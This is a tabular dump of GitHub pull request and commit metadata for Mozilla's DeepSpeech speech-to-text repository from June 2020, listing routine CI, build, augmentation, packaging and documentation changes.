840,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b52139ceb6ef54036b06a7140cf565178f21f654,Fix #3075: Add Android 11 to CI
841,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0fd28cfbdf0bd2add0a4467ade81efef5a2812ce,Updating caches
842,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a47c9a2b8c847a621abbb46ed892b518f118f20e,"Request android default instead of google_apis

It seems some armv7a image disappeared"
843,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e3b4bb3a6a608472382e5a45b3243aee14a3c2a,Added third-party bindings for NIM-lang.
844,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3094,3094,Update msys2 to 2020-06-20 release,,lissyx,1645737,2020-06-23T13:52:06Z,COLLABORATOR,True,36,16,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da471ecbab84f662e3a59965eb9b3da23cb31ef8,Fix #3095: Update msys2 to 2020-06-20 release
845,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3091,3091,Warp augmentation,,tilmankamp,5991088,2020-06-19T12:15:29Z,CONTRIBUTOR,True,47,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eebf12134ed61abfc9a67af1552942a7e4683bec,Warp augmentation
846,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3091,3091,Warp augmentation,,tilmankamp,5991088,2020-06-19T12:15:29Z,CONTRIBUTOR,True,47,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a48ebdfde8a561161cec0f124099ca0f337ef8b5,Reverb augmentation: Workaround for import problem in scikit-learn dependency of librosa
847,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3090,3090,Fix #3089 - Recreate overlay queue on augmentation restart,,tilmankamp,5991088,2020-06-19T09:12:45Z,CONTRIBUTOR,True,5,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da96d14eaaecbb252b3dc922b1e27f86feac9e62,Fix #3089 - Recreate overlay queue on augmentation restart
848,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3087,3087,Install checkpoint converting tool in container.,,DanBmh,18572490,2020-06-18T13:22:37Z,CONTRIBUTOR,True,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eda5f69f2d902d7f5d357519e7f20aae38f656b2,Install checkpoint converting tool.
849,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3087,3087,Install checkpoint converting tool in container.,,DanBmh,18572490,2020-06-18T13:22:37Z,CONTRIBUTOR,True,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e17619bec8a1fa00b191e3e1a0bb9d93165da4e0,Make paths relative.
850,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3085,3085,Bump VERSION to 0.7.4,,reuben,477142,2020-06-18T12:56:36Z,MEMBER,True,12,12,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bc31eb4b9ef5d311ff6cee70c2c23a4cd947973c,Fix usage of ARG instead of ENV in Dockerfile.train
851,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3085,3085,Bump VERSION to 0.7.4,,reuben,477142,2020-06-18T12:56:36Z,MEMBER,True,12,12,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5edc1cf5033ecec4d1bcaa9792508d589c617575,Bump VERSION to 0.7.4
852,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3083,3083,Add dependencies for new audio augmentation flags. Fixes #3082.,The already installed pip versions of opuslib and numba also work.,DanBmh,18572490,2020-06-18T10:27:01Z,CONTRIBUTOR,True,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3f8033e1f1aa84558d50bfd992d38ef5582dd500,Add dependencies for new audio augmentation flags. Fixes #3082.
853,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3080,3080,Remove --force-reinstall from training code install,No longer needed since we started publishing ds_ctcdecode on PyPI.,reuben,477142,2020-06-17T13:27:16Z,MEMBER,True,4,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ccbbede090df1afa96861ae06ff0eaba86e3488,"Remove --force-reinstall from training code install

No longer needed since we started publishing ds_ctcdecode on PyPI."
854,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3078,3078,Fix #3077: Do not error on scorer generation when no error was generated,,lissyx,1645737,2020-06-17T12:35:49Z,COLLABORATOR,False,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a566a2c0c49f7f37054085227c0882d9eab123df,Fix #3077: Do not error on scorer generation when no error was generated
855,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3076,3076,Added third-party bindings for NIM-lang.,"Hello there.
I have added DeepSpeech bindings for [nim-lang](https://nim-lang.org) and wanted to add it into the 3rd Party Bindings list.

I am using `git tags` starting with DeepSpeech's version `0.7.x`  and  hoping to use tag system for handling changes/breakage in upcoming API.",eagledot,42858179,2020-06-17T04:45:24Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e3b4bb3a6a608472382e5a45b3243aee14a3c2a,Added third-party bindings for NIM-lang.
856,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3074,3074,Fix #3073: Update libssl version,,lissyx,1645737,2020-06-16T21:38:46Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7768c89e2a8d4dd99f93cb702a3e44bbc415f1f9,Fix #3073: Update libssl version
857,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3072,3072,Fix #3071: Don't reinstall TensorFlow on top of TensorFlow,,lissyx,1645737,2020-06-16T20:15:15Z,COLLABORATOR,True,18,9,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4f4903b2bf0da15163d65e01e5cc3c71bfba81a,Fix #3071: Don't reinstall TensorFlow on top of TensorFlow
858,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3072,3072,Fix #3071: Don't reinstall TensorFlow on top of TensorFlow,,lissyx,1645737,2020-06-16T20:15:15Z,COLLABORATOR,True,18,9,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,07c8daef43f94b04dfe978eda81388388406ad6c,"Update setup.py

Co-authored-by: Reuben Morais <reuben.morais@gmail.com>"
859,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3069,3069,Fix #3068: More generic TaskCluster build/caching tasks,,lissyx,1645737,2020-06-16T15:55:55Z,COLLABORATOR,True,321,524,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4f7842c96657c24c3bc3f0e7cb6ae9efd848e15a,Fix #3068: More generic TaskCluster build/caching tasks
860,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3069,3069,Fix #3068: More generic TaskCluster build/caching tasks,,lissyx,1645737,2020-06-16T15:55:55Z,COLLABORATOR,True,321,524,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b52139ceb6ef54036b06a7140cf565178f21f654,Fix #3075: Add Android 11 to CI
861,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3069,3069,Fix #3068: More generic TaskCluster build/caching tasks,,lissyx,1645737,2020-06-16T15:55:55Z,COLLABORATOR,True,321,524,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0fd28cfbdf0bd2add0a4467ade81efef5a2812ce,Updating caches
862,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3069,3069,Fix #3068: More generic TaskCluster build/caching tasks,,lissyx,1645737,2020-06-16T15:55:55Z,COLLABORATOR,True,321,524,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a47c9a2b8c847a621abbb46ed892b518f118f20e,"Request android default instead of google_apis

It seems some armv7a image disappeared"
863,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3067,3067,Ignore generated dockerfiles,,DanBmh,18572490,2020-06-16T14:26:10Z,CONTRIBUTOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e10b807e92552bff498feba65d97417572e17a9b,Ignore generated dockerfiles.
864,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3066,3066,Fix #3053: Check output stream when producing scorer,,lissyx,1645737,2020-06-16T10:41:41Z,COLLABORATOR,True,34,6,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c2cbbd725928b4fba6e90d9bc7381bf3cc28911,Fix #3053: Check output stream when producing scorer
865,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3065,3065,Fix #2942: Document supported platforms,,lissyx,1645737,2020-06-16T09:34:11Z,COLLABORATOR,True,71,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aeb4c5b10599acde1631583ec7433f8441f688b3,Fix #2942: Document supported platforms
866,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3062,3062,DOC: Fixed grammatical mistake.,,ObliviousParadigm,47667852,2020-06-14T10:30:45Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c294d80a9312563de55bd77f570743927df04777,DOC: Fixed grammatical mistake.
867,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3060,3060,Decouple Dockerfile into build and train,,lissyx,1645737,2020-06-11T10:41:21Z,COLLABORATOR,True,163,108,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d541394e86079a61781ba50ad61c99d3e6d1ea4,Decouple Dockerfile into build and train
868,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3055,3055,Refactoring of TF based augmentations,,tilmankamp,5991088,2020-06-10T11:17:46Z,CONTRIBUTOR,True,789,872,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d94db7ca43614854f782305cecb4c07f7d68ccb3,Refactoring of TF based augmentations
869,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3055,3055,Refactoring of TF based augmentations,,tilmankamp,5991088,2020-06-10T11:17:46Z,CONTRIBUTOR,True,789,872,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0bec67d74cd546ec64c55c3eedb30d266934ef19,"Update bin/play.py

Co-authored-by: Reuben Morais <reuben.morais@gmail.com>"
870,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3055,3055,Refactoring of TF based augmentations,,tilmankamp,5991088,2020-06-10T11:17:46Z,CONTRIBUTOR,True,789,872,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea21c7d24e7ae4336f3de4d9077f69b63e6f5568,"Apply suggestions from code review

Co-authored-by: Reuben Morais <reuben.morais@gmail.com>"
871,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3055,3055,Refactoring of TF based augmentations,,tilmankamp,5991088,2020-06-10T11:17:46Z,CONTRIBUTOR,True,789,872,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5b6de213d8dc8893647261f38dcfaf454854225c,Follow-up on PR comments; removed warp augmentation; split pitch_and_tempo augmentation
872,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3055,3055,Refactoring of TF based augmentations,,tilmankamp,5991088,2020-06-10T11:17:46Z,CONTRIBUTOR,True,789,872,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d5dcc359a694d506057fbf048ecf7996e71a120,Tests for TF based value range picking
873,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3055,3055,Refactoring of TF based augmentations,,tilmankamp,5991088,2020-06-10T11:17:46Z,CONTRIBUTOR,True,789,872,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a835bee5a8676eb173e1dce78f1958bdcc94a94,Updated training tests
874,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3055,3055,Refactoring of TF based augmentations,,tilmankamp,5991088,2020-06-10T11:17:46Z,CONTRIBUTOR,True,789,872,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a28df45192e84aaaeebb9c8dad2094a0f9367b1a,Respect None case for augmentations list
875,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3055,3055,Refactoring of TF based augmentations,,tilmankamp,5991088,2020-06-10T11:17:46Z,CONTRIBUTOR,True,789,872,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5dd08d2f8eec44705fe90c7ae351d202cf54d4df,Deactivated scorer in graph augmentation test
876,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3054,3054,Report imported vs total audio time,,lissyx,1645737,2020-06-10T11:12:40Z,COLLABORATOR,True,8,2,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfc79799ecae723194e95aeb6a9b677cee322964,Report imported vs total audio time
877,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3052,3052,Split TaskCluster training,,lissyx,1645737,2020-06-08T23:20:12Z,COLLABORATOR,False,111,10,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ebe2fc0470bb43c461e904c27b44ae07c7fa0aba,Split TaskCluster training
878,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3051,3051,Add read-only metrics tracking,For now just a way to look at extra validation sets without affecting best validation loss.,reuben,477142,2020-06-08T13:52:37Z,MEMBER,True,189,15,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e069b6d61f4e87ddd356fc965470549d3a6f19cf,"Add read only validation metrics

For now this is just CTC loss like a validation set, but without affecting
best validation checkpoint tracking logic. Eventually this could compute WER
on a smaller set, for example."
879,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3051,3051,Add read-only metrics tracking,For now just a way to look at extra validation sets without affecting best validation loss.,reuben,477142,2020-06-08T13:52:37Z,MEMBER,True,189,15,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,07d2c39138805d8eb15f481c4c5511a2cb89f895,Split SDB tests from basic training tests to speed up CI dependents
880,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3051,3051,Add read-only metrics tracking,For now just a way to look at extra validation sets without affecting best validation loss.,reuben,477142,2020-06-08T13:52:37Z,MEMBER,True,189,15,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ecd79531c8d27f95392a1e3b999e7c8d5f8a7d93,Add training test with --metrics_files
881,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8a87d1d100b6f662b03fc164536fcc171d7f7796,"Fix arguments order in pcm_to_np call

pcm_to_np takes segment buffer as its first argument and audio format as a second one. The wrong order cause ""bytes object has no attribute 'channels'' ArgumentError."
882,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3ae74f80ae496eda8ed28606fead03721afa2cb,Bump VERSION to 0.7.2
883,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61696afedcae8696ea4b668db5134b26772828c4,"Merge pull request #3034 from lissyx/bump-v0.7.2

Bump VERSION to 0.7.2"
884,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3b0eb65894fce009a836ef3d787c48ce45632b4,Install npm deps for RTD
885,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cd571ff4be6184ae6ce73632af5f6ca76d646762,Bump VERSION to 0.7.3
886,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88584941bc2ff5b91d6b11ad0a6b85da391d626b,"Merge pull request #3036 from lissyx/doc-fix

Install npm deps for ReadTheDocs"
887,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5ca78a4ed8ccffff4324c8df39cbc64dba9db30,"Merge pull request #3030 from marekjg/master

Fix arguments order in pcm_to_np call"
888,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23139b24303adb3ecce4cf79c75f9cd2832480a9,Make TaskCluster build the docs like RTD
889,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11f347b4daafd8d5bed6fec55de2de3e5882d326,"Merge pull request #3037 from lissyx/rtd-taskcluster-united

Make TaskCluster build the docs like RTD"
890,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c074bb2f6df34f0af8a5f3cd5b48f97b086eeec4,Add missing TFLite binaries
891,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,80a3d7068617d3436d989408e4728bfd9cd8e059,"Merge pull request #3042 from lissyx/tflite-upload

Add missing TFLite binaries"
892,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c83f9f24a9c072884b1ab2246b5c6c44475e086,Fix csv writer parameter [https://docs.python.org/3/library/csv.html#csv.writer]
893,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a252ae01a051792565d8b39b74ad3c03215e8830,Fix csv DictWriter parameter
894,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,544aa364fc7ead695c6a827384697cb756f21cad,Publish decoder wheel to PyPI
895,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1a808b216e71e4ff76fa847dab8ee23cc09d66c6,Download decoder wheel from PyPI
896,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,209056ceb59cdb7dd380d9b8f281e0befca3c4cb,Test PyPI decoder package after upload
897,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,28c7f4c35de26c3de0908efb7fccbeed354e29a5,Only use drop_remainder in dataset for train phase
898,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53192b68b820db7bf06a272ce26a42b8a42a1d78,Be more specific in %ignoring symbols since it applies to all imports
899,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06408b8ddd40ea0233f9e2ca2b8805692faa8e16,Flip direction of VERSION and GRAPH_VERSION links
900,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a739c9b98cbb31b01e00e3af33645e986bb458f,"Merge pull request #3047 from mozilla/dev-test-no-rounding

Only use drop_remainder in dataset for train phase"
901,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,daba4278ff3dc59d665212f35cc4424eea86aaaf,Add explanation of SWIG ignore side effects
902,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba7b0f7436f351e49f164d1039a2a3b841826c89,Merge branch 'alphabet-leak' (Fixes #3049)
903,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b3ae9701b1d04a93b9700e1d62b720f44c20ea8d,"Merge pull request #3046 from mozilla/setup-decoder-pypi

Use decoder package from PyPI (Fixes #3044)"
904,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fdf5700d37564a362918ea73d948726b38941fda,"Merge pull request #3045 from ricky-cck/master

Fix csv writer parameter"
905,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,572963e7bd5c12f0355b5816bb4c9600b71e8dbe,"Merge pull request #3043 from mozilla/version-not-symlink

Move VERSION and GRAPH_VERSION to training directory"
906,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3050,3050,Update r0.8,,reuben,477142,2020-06-08T12:46:56Z,MEMBER,True,234,98,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6efdc6d0111c52637c652ea64af04d4d0667f0c,Merge branch 'master' into update-r0.8
907,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3049,3049,Be more specific in %ignoring symbols since it applies to all imports (Fixes #3048),,reuben,477142,2020-06-08T09:20:45Z,MEMBER,True,2,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53192b68b820db7bf06a272ce26a42b8a42a1d78,Be more specific in %ignoring symbols since it applies to all imports
908,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3047,3047,Only use drop_remainder in dataset for train phase,Stop doing incomplete validation and test epochs.,reuben,477142,2020-06-08T08:47:42Z,MEMBER,True,1,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,28c7f4c35de26c3de0908efb7fccbeed354e29a5,Only use drop_remainder in dataset for train phase
909,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3046,3046,Use decoder package from PyPI (Fixes #3044),,reuben,477142,2020-06-08T08:24:15Z,MEMBER,True,164,26,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,544aa364fc7ead695c6a827384697cb756f21cad,Publish decoder wheel to PyPI
